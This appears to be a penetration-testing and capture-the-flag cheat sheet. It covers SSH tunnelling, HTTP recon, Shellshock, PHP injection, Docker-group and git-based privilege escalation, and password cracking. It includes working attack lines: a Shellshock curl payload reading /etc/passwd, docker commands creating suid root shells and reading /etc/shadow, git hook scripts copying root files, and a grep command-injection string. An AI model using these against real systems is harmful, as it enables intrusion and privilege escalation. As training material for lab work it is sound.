If ftp anonymous login is provided or you have login details, you can download the contents by wget, (For anonymous login user password are not required)

::

  wget -rq ftp://IP --ftp-user=username --ftp-password=password

wgetrc Commands
^^^^^^^^^^^^^^^

::

 output_document = file -- Set the output filename—the same as ‘-O file’.
 post_data = string -- Use POST as the method for all HTTP requests and send string in the request body. The same as ‘--post-data=string’.
 post_file = file   -- Use POST as the method for all HTTP requests and send the contents of file in the request body. The same as ‘--post-file=file’.
 -P prefix
 --directory-prefix=prefix
   Set directory prefix to prefix.  The directory prefix is the directory where all other files and subdirectories will be saved to, i.e. the top of the retrieval tree.  The default is . (the current directory).

Tricks
^^^^^^

* The interesting part with -P Parameter is you can save the file in /tmp if your current directory is /. Let me explain, Let's say, your current directory is /home/user/ if we do

 ::

  wget IPAddress -P tmp

 it would create a tmp folder in the /home/user/ and save the file in that. However, if you current directory is /, it would save the file in /tmp folder, from where you can execute stuff.

* wget accepts IP address in decimal format 




SSH
---

ssh_config
^^^^^^^^^^
If you know the password of the user, however, ssh is not allowing you to login, check ssh_config.

::

   ## Tighten security after security incident 
   ## root never gets to log in remotely PermitRootLogin no 
   ## Eugene & Margo can SSH in, no-one else allowed 
   AllowUsers example_user1 example_user2 
   ## SSH keys only but example_user1 can use a password 
   Match user example_user1 
   PasswordAuthentication yes 	
   ## End tighten security

SSH Tunneling
-------------

SSH protocol, which supports bi-directional communication channels can create encrypted tunnels.

Local Port Forwarding
^^^^^^^^^^^^^^^^^^^^^

SSH local port forwarding allows us to tunnel a local port to a remote server, using SSH as the transport protocol.

::

 ssh sshserver -L <local port to listen>:<remote host>:<remote port>

Example: 

Imagine we’re on a private network which doesn’t allow connections to a specific server. Let’s say you’re at work and youtube is being blocked. To get around this we can create a tunnel through a server which isn’t on our network and thus can access Youtube.

::

 $ ssh -L 9000:imgur.com:80 user@example.com

The key here is -L which says we’re doing local port forwarding. Then it says we’re forwarding our local port 9000 to youtube.com:80, which is the default port for HTTP. Now open your browser and go to http://localhost:9000

Remote Port Forwarding
^^^^^^^^^^^^^^^^^^^^^^

SSH remote port forwarding allows us to tunnel a remote port to a local server.

::

 ssh sshserver -R <remote port to bind>:<local host>:<local port>

Example:

Let's say there's a wordpress web-application we have compromised and have a www-data shell. Also, let's say, we are inside a docker environment with the network below

::

 172.16.0.1 Host-Machine
 172.16.0.2 WordPress
 172.16.0.3 Joomla
 172.16.0.4 Mysql

Now, Let's say, we have root credentials of mysql and want to access it using dbeaver application. Now, as we have access of wordpress machine, we can basically ssh to our machine (Let's say our IP is 10.10.15.111), creating a Remote Port Forward

::

 ssh bitvijays@10.10.15.111 -R 3306:172.16.0.4:3306

The above would create a ssh tunnel between 10.10.15.111:3306 and 172.16.0.4:3306. Then, we would be able to just launch dbeaver and connect to localhost mysql and browse the database at 172.16.0.4:3306.

As we would be probably inside the docker and www-data user, we might not have ssh binary and proper environment variable in that case, we can add below options

::

 ./ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i id_rsa -R 3306:172.16.0.4:3306 -fN bitvijays@10.10.15.111

SSH as SOCKS Proxy
^^^^^^^^^^^^^^^^^^
We can use ssh to have a socks proxy to connect to vnc, ssh, rdp if vm is hosting in another vm and then use remmina to access VNC.

:: 

  ssh -D localhost:9050 user@host

  -D [bind_address:]port Specifies a local “dynamic” application-level port forwarding.  This works by allocating a socket to listen to port on the local side, optionally bound to the specified bind_address.  Whenever a connection is made to this port, the connection is forwarded over the secure channel, and the application protocol is then used to determine where to connect to from the remote machine.  Currently the SOCKS4 and SOCKS5 protocols are supported, and ssh will act as a SOCKS server.  Only root can forward privileged ports. Dynamic port forwardings can also be specified in the configuration file.

and 
	
:: 
	
  proxychains4 remmina/ rdesktop

If we have to share a interesting story with you, Recently, We were assigned a engagment to compromise a industrial plant. Let us walkthru what's the scenario.

Scenario:

* Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)
* As it's a industrial plant, there's a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 -- This is NATTed IP)
* 

HTTP
----

First things
^^^^^^^^^^^^

* View Source of the web-page (Ctrl+U).
* Inspect element of the web-page (F12).
* See if there is any hint in the title of the web page. (example: /Magic).
* Check the scroll button! Sometimes, there are too many lines and something hidden in the end of the webpage!
* Check for any long file names such admin_5f4dcc3b5aa765d61d8327deb882cf99.txt; Such long names can be base64-encoded, hex, md5 etc.
* If any login page is implemented asking for username and password. Check how it is implemented? Is it using any open-source authentication modules? If so, look if there are any default passwords for that.
* If there's a page where redirect is happening (for example, http://example.com or http://example.com/support.php redirects us to http://example.com/login.php) However, the response size for example.com or support.php is a bit off, especially considering the page gives a 302 redirect. We may use No-redirect extension from firefox and view the page. We may also utilize curl/ burp to view the response.
* `List of HTTP Headers <https://en.wikipedia.org/wiki/List_of_HTTP_header_fields>`_ : Quite important when you want to set headers/ cookies etc.
* Watch for places where the site redirects you (it adds something to the URL and displays the homepage). If you see that happen, try adjusting the URL manually. for example: 
  when browsing 

 ::

   http://IPAddress/SitePages/

 it redirects to 

 :: 

  http://IPAddress/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx

 we may find something by adjusting the URL manually to 

 ::

  http://IPAddress/SitePages/Forms/AllPages.aspx

htaccess - UserAgent
^^^^^^^^^^^^^^^^^^^^
When you see something like this "Someone's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content". Which says, only this can see me. Try to see what user-agent it is talking about. The way it is implemented is by use of .htaccess file

:: 

   cat .htaccess 
   BrowserMatchNoCase "iPhone" allowed

   Order Deny,Allow 
   Deny from ALL 
   Allow from env=allowed 
   ErrorDocument 403 “<H1>Super secret location - only me and Steve Jobs can see this content</H1><H2>Lol</H2>”

CGI-BIN Shellshock
^^^^^^^^^^^^^^^^^^
To understand shellshock few blogs can be referred such as `ShellShocked – A quick demo of how easy it is to exploit <https://www.surevine.com/shellshocked-a-quick-demo-of-how-easy-it-is-to-exploit/>`_ , `Inside Shellshock: How hackers are using it to exploit systems <https://blog.cloudflare.com/inside-shellshock/>`_

::

  curl -H "User-Agent: () { :; }; echo 'Content-type: text/html'; echo; /bin/cat /etc/passwd" http://192.168.56.2:591/cgi-bin/cat

It is important to understand what is cgi-bin which can be read from `Creating CGI Programs with Bash: Getting Started <http://www.team2053.org/docs/bashcgi/gettingstarted.html>`_ . Also the most important lines in this file are:

::

  echo "Content-type: text/html"
  echo ""
 
These two lines tell your browser that the rest of the content coming from the program is HTML, and should be treated as such. Leaving these lines out will often cause your browser to download the output of the program to disk as a text file instead of displaying it, since it doesn't understand that it is HTML!

**Shellshock Local Privilege Escalation**

Binaries with a setuid bit and calling (directly or indirectly) bash through execve, popen or system are tools which may be used to activate the Shell Shock bug.

::

  sudo PS1="() { :;} ;  /bin/sh" /home/username/suidbinary

Shellshock also affects DHCP as mentioned `Shellshock DHCP RCE Proof of Concept <https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/>`_ There's a metasploit module named "Dhclient Bash Environment Variable Injection (Shellshock)" for this.

XSS/ HTML Injection
^^^^^^^^^^^^^^^^^^^

The below will redirect the page to google.com

::
 
  <META http-equiv=“refresh” content=“0;URL=http://www.google.com”>

curl
^^^^

:: 

    -k, --insecure
    (SSL) This option explicitly allows curl to perform "insecure" SSL connections and transfers. All SSL connections are attempted to be made secure by using the CA certificate  bundle  installed  by  default.
    This makes all connections considered "insecure" fail unless -k, --insecure is used.

    -I, --head
    (HTTP/FTP/FILE) Fetch the HTTP-header only! HTTP-servers feature the command HEAD which this uses to get nothing but the header of a document. When used on an FTP or FILE file, curl displays the  file  size and last modification time only.

HTTP Referer
^^^^^^^^^^^^

The Referer request header contains the address of the previous web page from which a link to the currently requested page was followed. The Referer header allows servers to identify where people are visiting them from and may use that data for analytics, logging, or optimized caching.

::
   
  Referer: <url>

  <url> An absolute or partial address of the previous web page from which a link to the currently requested page was followed. URL fragments (i.e. "#section") are not included.

Data-URI
^^^^^^^^^
`Basics of HTTP Data URI <https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics\_of\_HTTP/Data\_URIs>`_

Login-Pages
^^^^^^^^^^^
To test login pages, we may use burpsuite intruder and check for different length of response.

Delete Tags
^^^^^^^^^^^
Delete all lines between tags including tags:

::
   
  sed '/<tag>/,/<\/tag>/d' input.txt

.. Tip :: Useful when you are accessing the webpage using curl and their LFI and you want to remove the html/ body tags.

HTTP 404 Custom Page
^^^^^^^^^^^^^^^^^^^^
Sometimes, it's a good idea to look at 404 custom page also. There might be some information stored

PHP
^^^

* PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ and `Exploiting PHP PCRE Functions <http://www.madirish.net/402>`_ 

* PHP has `Complex (curly) syntax <http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>`_ The Complex Syntax to allow evaluation of our own code in double quotes. 
  
  Example
  
  :: 
  
   $use_me = "ls -lah"
   {${system($use_me)}}

  This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).

Docker Security
---------------

Any user who is part of the docker group should also be considered root. Read `Using the docker command to root the host <http://reventlov.com/advisories/using-the-docker-command-to-root-the-host>`_ Older version of docker were vulnerable to Docker breakout. More details at `Shocker / Docker Breakout PoC <https://github.com/gabrtv/shocker>`_

If you are the docker user and want to get root. 

Create a Dockerfile
^^^^^^^^^^^^^^^^^^^

::

 mkdir docker-test
 cd docker-test

 cat > Dockerfile
 FROM debian:wheezy
 ENV WORKDIR /stuff
 RUN mkdir -p $WORKDIR
 VOLUME [ $WORKDIR ]
 WORKDIR $WORKDIR

Build the Docker
^^^^^^^^^^^^^^^^

::

 docker build -t my-docker-image .

Become root?
^^^^^^^^^^^^

* Copy binaries from the container into the host and give them suid permissions:

 ::

  docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'

  ./sh
  whoami
  # root

 If the sh is not working, create a suid.c, compile it, suid it and run.

* Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:

 ::


  docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat shadow'
  # root:!:16364:0:99999:7:::
  # daemon:*:16176:0:99999:7:::
  # bin:*:16176:0:99999:7:::
  # ...

* Bind the host’s / and overwrite system commands with rogue programs:

 ::

  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/rogue-program /stuff/bin/cat'

* Privileged copy of bash for later access?

 ::

  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
  root-shell-ftw  -p
  root-shell-ftw-4.3#

Password Protected File
------------------------
	  
ZIP File
^^^^^^^^

run fcrackzip

:: 

    fcrackzip -D -u -p /tmp/rockyou2.txt flag.zip

    -D, --dictionary:    Select dictionary mode. In this mode, fcrackzip will read passwords from a file, which must contain one password per line and should be alphabetically sorted (e.g. using sort(1)).
    -p, --init-password string :  Set initial (starting) password for brute-force searching to string, or use the file with the name string to supply passwords for dictionary searching.
    -u, --use-unzip: Try to decompress the first file by calling unzip with the guessed password. This weeds out false positives when not enough files have been given.

rar2john
^^^^^^^^
We can get the password hash of a password protected rar file by using rar2john

:: 

    [root:~/Downloads]# rar2john crocs.rar
    file name: artwork.jpg
    crocs.rar:$RAR3$*1*35c0eaaed4c9efb9*463323be*140272*187245*0*crocs.rar*76*35:1::artwork.jpg

keepass2john
^^^^^^^^^^^^

::

 keepass2john user.kdbx 
 user:$keepass$*2*6000*222*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da

::

 john --wordlist wordlist --format=keepass hashfile

There are other \*2john thingy

::

 dmg2john
 gpg2john
 hccap2john
 keepass2john
 keychain2john
 keyring2john
 keystore2john
 kwallet2john
 luks2john
 pfx2john
 putty2john
 pwsafe2john
 racf2john
 rar2john
 ssh2john
 truecrypt_volume2john
 uaf2john
 wpapcap2john
 zip2john


Encrypted Files
---------------

Many times during the challenges, we do find encrypted files encrypted by Symmetric key encryption or RSA Public-Private Key encryption

Symmetric Key
^^^^^^^^^^^^^

If we have the encrypted file and the key to it. However, we don't know the encryption scheme such as aes-128-cbc, des-cbc.

We can use the code written by superkojiman in `De-ICE Hacking Challenge Part-1 <https://blog.techorganic.com/2011/07/19/de-ice-hacking-challenge-part-1/>`_ , it would tell you what encryption scheme is used and then we can run the command to retrieve the plaintext.

::

 ciphers=`openssl list-cipher-commands`
 for i in $ciphers; do
  openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> > /dev/null 2>&1
  if [[ $? -eq 0 ]]; then
   echo "Cipher is $i: openssl enc -d -${i} -in <encrypted-file> -k <password/ keyfile> -out foo.txt"
   exit
  fi
 done

RSA Public-Private Key encryption
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If we have found a weak RSA public, we can use `RsaCtfTool <https://github.com/Ganapati/RsaCtfTool>`_ uncipher data from weak public key and try to recover private key and then use 

::

 openssl rsautl -decrypt -inkey privatekey.pem -in <encryptedfile> -out key.bin 

The ciphertext should be in binary format for RsaCtfTool to work. If you have your ciphertext in hex, for example

::

 5e14f2c53cbc04b82a35414dc670a8a474ee0021349f280bfef215e23d40601a

Convert it in to binary using

::

 xxd -r -p ciphertext > ciphertext3


RSA given q, p and e?
^^^^^^^^^^^^^^^^^^^^^

Taken from `RSA Given q,p and e <https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e>`_

::

 def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y

 def main():

    p = 1090660992520643446103273789680343
    q = 1162435056374824133712043309728653
    e = 65537
    ct = 299604539773691895576847697095098784338054746292313044353582078965

    # compute n
    n = p * q

    # Compute phi(n)
    phi = (p - 1) * (q - 1)

    # Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a

    print( "n:  " + str(d) );

    # Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )

 if __name__ == "__main__":
    main()


SECCURE Elliptic Curve Crypto Utility for Reliable Encryption
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

If you see, something like this

::

 '\x00\x146\x17\xe9\xc1\x1a\x7fkX\xec\xa0n,h\xb4\xd0\x98\xeaO[\xf8\xfa\x85\xaa\xb37!\xf0j\x0e\xd4\xd0\x8b\xfe}\x8a\xd2+\xf2\xceu\x07\x90K2E\x12\x1d\xf1\xd8\x8f\xc6\x91\t<w\x99\x1b9\x98'

it's probably `SECCURE Elliptic Curve Crypto Utility for Reliable Encryption <http://point-at-infinity.org/seccure/>`_ Utilize python module `seccure <https://pypi.python.org/pypi/seccure>`_ to get the plaintext. 


Network Information
-------------------


Sometimes, ifconfig and netstat are not present on the system. If so, check if ip and ss are installed?

ip
^^

::

  ip addr
    
   1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
   17: wwan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000
      link/ether b2:06:fe:2b:73:c6 brd ff:ff:ff:ff:ff:ff
     inet 14.97.194.148/30 brd 14.97.194.151 scope global dynamic noprefixroute wwan0
       valid_lft 5222sec preferred_lft 5222sec

hostname
^^^^^^^^

We can also check the ipaddress of the host using hostname command

::

 hostname -I
 172.17.0.1 14.97.194.148 

ss
^^

ss - another utility to investigate sockets

::

 ss
 
       -n, --numeric
              Do not try to resolve service names.
     -l, --listening
              Display only listening sockets (these are omitted by default).
       -t, --tcp
              Display TCP sockets.

       -u, --udp
              Display UDP sockets.


User Home Directory
-------------------

If we find that home directory contains

Firefox/ Thunderbird/ Seabird
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

We can utilize `Firefox Decrypt <https://github.com/unode/firefox_decrypt>`_ is a tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles. It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, a password will still be requested but can be left blank.

Sudoers file
------------

If the sudoers file contains: 
	
secure_path
^^^^^^^^^^^
Path used for every command run from sudo. If you don't trust the people running sudo to have a sane PATH environment variable you may want to use this. Another use is if you want to have the “root path” be separate from the “user path”. Users in the group specified by the exempt_group option are not affected by secure_path. This option is not set by default.

env_reset
^^^^^^^^^
If set, sudo will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO_* variables. Any variables in the caller's environment that match the env_keep and env_check lists are then added, followed by any variables present in the file specified by the env_file option (if any). The contents of the env_keep and env_check lists, as modified by global Defaults parameters in sudoers, are displayed when sudo is run by root with the -V option. If the secure_path option is set, its value will be used for the PATH environment variable. This flag is on by default.

mail_badpass
^^^^^^^^^^^^
Send mail to the mailto user if the user running sudo does not enter the correct password. If the command the user is attempting to run is not permitted by sudoers and one of the mail_all_cmnds, mail_always, mail_no_host, mail_no_perms or mail_no_user flags are set, this flag will have no effect. This flag is off by default.

run-parts
---------

run-parts runs all the executable files named, found in directory directory. This is mainly useful when we are waiting for the cron jobs to run. It can be used to execute scripts present in a folder.

:: 

  run-parts /etc/cron.daily

Java keystore file
------------------

Refer `Java Keytool essentials working with java keystores <https://www.digitalocean.com/community/tutorials/java-keytool-essentials-working-with-java-keystores>`_ and `openssl essentials working with ssl certificates private keys and csrs <https://www.digitalocean.com/community/tutorials/openssl-essentials-working-with-ssl-certificates-private-keys-and-csrs#convert-certificate-formats>`_

Cracking MD5 Hashes
-------------------

Try `Crackstation <https://crackstation.net/>`_ or `ISC Reverse hash <https://isc.sans.edu/tools/reversehash.html>`_

Steghide
--------
Looking for hidden text in the images? Utilize steghide

::

  steghide version 0.5.1

  the first argument must be one of the following:
  embed, --embed          embed data
  extract, --extract      extract data
  info, --info            display information about a cover- or stego-file
  info <filename>       display information about <filename>
  encinfo, --encinfo      display a list of supported encryption algorithms
  version, --version      display version information
  license, --license      display steghide's license
  help, --help            display this usage information

.. Tip :: Sometimes, there is no password, so just press enter.

Git client Privilege Escalation
--------------------------------
Git clients (before versions 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1) and Mercurial clients (before version 3.2.3) contained three vulnerabilities that allowed malicious Git or Mercurial repositories to execute arbitrary code on vulnerable clients under certain circumstances. Refer `12 Days of HaXmas: Exploiting CVE-2014-9390 in Git and Mercurial <https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial>`_

In one of write-up, `Nicolas Surribas <http://devloop.users.sourceforge.net/>`_ has mentioned about two git environment variables GIT_SSH and GIT_TEMPLATE which can be utilized to do privilege escalation if git clone is performed using a suid binary. Imagine a suid binary utilized to do git clone from a remote directory.

GIT_SSH
^^^^^^^

If either (GIT_SSH or GIT_SSH_COMMAND) of these environment variables is set then git fetch and git push will use the specified command instead of ssh when they need to connect to a remote system. The command will be given exactly two or four arguments: the username@host (or just host) from the URL and the shell command to execute on that remote system, optionally preceded by -p (literally) and the port from the URL when it specifies something other than the default SSH port. $GIT_SSH_COMMAND takes precedence over $GIT_SSH, and is interpreted by the shell, which allows additional arguments to be included.  $GIT_SSH on the other hand must be just the path to a program (which can be a wrapper shell script, if additional arguments are needed).

::

  echo '#!/bin/bash' > cmd
  echo 'cp /root/flag.txt /tmp' >> cmd
  echo 'chmod 777 /tmp/flag.txt' >> cmd
  GIT_SSH=/home/username/cmd ./setuidbinary(utilizing git clone/ git fetch)

  or

  echo 'chown root:root /home/username/priv ; chmod 4755 /home/username/priv' > ssh

  where priv is binary compiled from suid.c

This basically changes the command from

::

  trace: built-in: git 'clone' 'ssh://root@machine-dev:/root/secret-project' '/mnt/secret-project/'

to

::

  trace: run_command: '/home/user/ssh' 'root@machine-dev' 'git-upload-pack '\''/root/secret-project'\'''

GIT_TEMPLATE_DIR
^^^^^^^^^^^^^^^^^
Files and directories in the template directory whose name do not start with a dot will be copied to the $GIT_DIR after it is created. Refer `Git-init <https://git-scm.com/docs/git-init>`_ 

::

  cp -r /usr/share/git-core/templates/ mytemplates
  cd mytemplates/hooks
  echo '#!/bin/bash' > post-checkout
  echo 'cp /root/flag /tmp/flag2' >> post-checkout
  echo 'chown username.username /tmp/flag2' >> post-checkout
  chmod +x post-checkout
  cd ../..
  GIT_TEMPLATE_DIR=/home/username/mytemplates/ ./setuidbinary( utilizing git clone/ git fetch)


Metasploit shell upgrade
------------------------

In metasploit framework, if we have a shell ( you should try this also, when you are trying to interact with a shell and it dies (happened in a VM), we can upgrade it to meterpreter by using sessions -u

:: 

   sessions -h
   Usage: sessions [options]
   
   Active session manipulation and interaction.

   OPTIONS:

   -u <opt>  Upgrade a shell to a meterpreter session on many platforms



Truecrypt Files
---------------

If you have a truecrypt volume to open and crack it's password, we can use truecrack to crack the password and veracrypt to open the truecrypt volume.

:: 

  truecrack --truecrypt <Truecrypt File> -k SHA512 -w <Wordlist_File>

and Veracrypt or cryptsetup to open the file.

::

  cryptsetup open --type tcrypt <Truecrypt> <MountName>



   
 
Grep in input box?
------------------

* If the html code contains the below where $key is the input from the user, and we want to read a particular value

  ::
   
    passthru("grep -i $key dictionary.txt");

   Remember grep works in a way "grep bitvijays /etc/passwd" is find bitvijays in /etc/passwd. This can be used in reading some files on the disk.

* If the above contains

  ::

   if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
        } else {
        passthru("grep -i $key dictionary.txt");
    }

    Here we can use ".* /etc/passwd #" 

 This command searches for any character in the file and comments out the reference to dictionary.txt


Others
------
* It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.

* If there's a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.

* If OPcache engine seemed to be enabled ( check from phpinfo.php file ) which may allow for exploitation (see the following article)https://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/

* Identification of OS:
	
 :: 

  cat /etc/os-release

  NAME="Ubuntu" VERSION="16.04 LTS (Xenial Xerus)" ID=ubuntu
  ID\_LIKE=debian PRETTY\_NAME="Ubuntu 16.04 LTS" VERSION\_ID="16.04"
  HOME\_URL="http://www.ubuntu.com/"
  SUPPORT\_URL="http://help.ubuntu.com/"
  BUG\_REPORT\_URL="http://bugs.launchpad.net/ubuntu/"
  UBUNTU\_CODENAME=xenial

* Many times if IPv6 is enabled, probably you can utilize IPv6 to connect and bypass firewall restrictions ( If firewall is not implemented at IPv6 level - many times it is not ).

 * To find IPv6 from SNMP 

  :: 

   snmpwalk -v2c -c public prism 1.3.6.1.2.1.4.34.1.3    
   iso.3.6.1.2.1.4.34.1.3.2.48.1.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544320
   iso.3.6.1.2.1.4.34.1.3.2.48.2.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 335544321
   iso.3.6.1.2.1.4.34.1.3.2.48.2.18.52.86.120.171.205.0.0.0.0.0.0.0.1 = INTEGER: 335544323

  Now, convert the decimal value after "iso.3.6.1.2.1.4.34.1.3.2" to hex which would be your IPv6 address "3002:1234:5678:ABCD::1"

 .. ToDo ::  Mention examples for IPv6 connect


* Port 139 Open

 :: 

   smbclient -N -L 192.168.1.2 WARNING: The "syslog" option is deprecated
   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Sharename       Type      Comment
   ---------       ----      -------
   print$          Disk      Printer Drivers
   kathy           Disk      Fred, What are we doing here?
   tmp             Disk      All temporary files should be stored here
   IPC$            IPC       IPC Service (red server (Samba, Ubuntu))

   Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]

   Server               Comment
   ---------            -------
   RED                  red server (Samba, Ubuntu)

   Workgroup            Master
   ---------            -------
   WORKGROUP            RED

   -N : If specified, this parameter suppresses the normal password prompt from the client to the user. This is useful when accessing a service that does not require a password. -L\|--list This option allows you to look at what services are available on a server. You use it as smbclient
   -L host and a list should appear. The -I option may be useful if your NetBIOS names don't match your TCP/IP DNS host names or if you are trying to reach a host on another network.


 If you want to access the share you might want to type

 :: 

   smbclient \\\\IP\\share\_name

 So, in the above example, it would be

 ::

   smbclient \\\\192.168.1.2\\kathy

 If port 139 is open, also run enum4linux, may be it would help get the user list
    
    


* Port 69 UDP:

  TFTP

  :: 

   get or put file

	    
* Ruby Best way to get quoted words / phrases out of the text

  :: 

    text.scan(/"([^"]\*)"/)

    
* Convert all text in a file from UPPER to lowercase
	
  :: 

   tr '[:upper:]' '[:lower:]' < input.txt > output.txt


* Remove lines longer than x or shorter than x

  :: 

   awk 'length($0)>x' filename or awk 'length($0)

* Remember, by default cewl generates a worldlist of one word. It by default ignore words in quotes. For example: if "Policy of Truth" is written in quotes. It will treat it as three words. However, what we wanted is to consider whole word between the quotes. By doing a small change in the cewl source code, we can get all the words in quotes, we also can remove spaces and changing upper to lower, we were able to create a small wordlist.

 
* Got a random string: Figure out what it could be? Hex encoded, base64 encoded, md5 hash. Use hash-identifier tool to help you.

* If a machine is running a IIS Server and we have found a way to upload a file. We can try asp web-shell or meterpreter of asp, aspx, aspx-exe executable formats from msfvenom.

* If we get a pcap file which contains 802.11 data and has auth, deauth and eapol key packets, most probably it's a packet-capture done using the wireless attack for WPA-Handshake. Use aircrack to see if there is any WPA handshake present.

 :: 

   13:06:21.922176 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.922688 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.923157 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.924224 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.924736 DeAuthentication (e8:50:8b:20:52:75 (oui Unknown)): Class 3 frame received from nonassociated station
   13:06:21.925723 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.933402 Probe Response (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] CH: 11, PRIVACY
   13:06:21.933908 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.934427 Clear-To-Send RA:e0:3e:44:04:52:75 (oui Unknown) 
   13:06:21.991250 Authentication (Open System)-1: Successful
   13:06:21.992274 Authentication (Open System)-1: Successful
   13:06:21.992282 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.992795 Authentication (Open System)-2: 
   13:06:21.992787 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:21.994834 Assoc Request (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit]
   13:06:21.994843 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:21.996890 Assoc Response AID(1) : PRIVACY : Successful
   13:06:21.996882 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.011783 Action (e8:50:8b:20:52:75 (oui Unknown)): BA ADDBA Response
   13:06:22.012314 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.012827 BAR RA:e8:50:8b:20:52:75 (oui Unknown) TA:c4:12:f5:0d:5e:95 (oui Unknown) CTL(4) SEQ(0) 
   13:06:22.013330 BA RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.014874 CF +QoS EAPOL key (3) v2, len 117
   13:06:22.015379 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.030226 CF +QoS EAPOL key (3) v1, len 117
   13:06:22.030746 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.043034 CF +QoS EAPOL key (3) v2, len 175
   13:06:22.043026 Acknowledgment RA:c4:12:f5:0d:5e:95 (oui Unknown) 
   13:06:22.054803 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056338 CF +QoS EAPOL key (3) v1, len 95
   13:06:22.056859 Acknowledgment RA:e8:50:8b:20:52:75 (oui Unknown) 
   13:06:22.064514 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.065030 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.079878 Clear-To-Send RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.080901 Acknowledgment RA:18:f6:43:9c:dc:5f (oui Unknown) 
   13:06:22.108096 DeAuthentication (c4:12:f5:0d:5e:95 (oui Unknown)): Class 3 frame received from nonassociated station
